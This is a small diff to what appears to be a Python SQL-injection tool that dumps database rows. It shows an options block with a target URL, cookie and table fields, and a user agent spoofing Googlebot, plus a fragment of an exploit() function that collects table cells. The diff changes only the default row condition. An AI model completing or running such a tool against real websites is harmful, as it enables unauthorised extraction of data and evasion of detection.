@@ -5,7 +5,7 @@ import requests
 options = {
 	"target" : "http://www.example.com/index.php?id=1",
 	"cookies" : "",
-	"row_condition" : "1",
+	"row_condition" : "",
 	"follow_redirections" : 0,
 	"user_agent" : "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 	"table_name" : "",
@@ -64,7 +64,7 @@ def exploit():
     for column in columns:
         row_cells.append(column)
     dump.append(row_cells)
-    if options["row_condition"] != '1':
+    if options["row_condition"]:
         row_cells = []
         for column in columns:
             count = 1
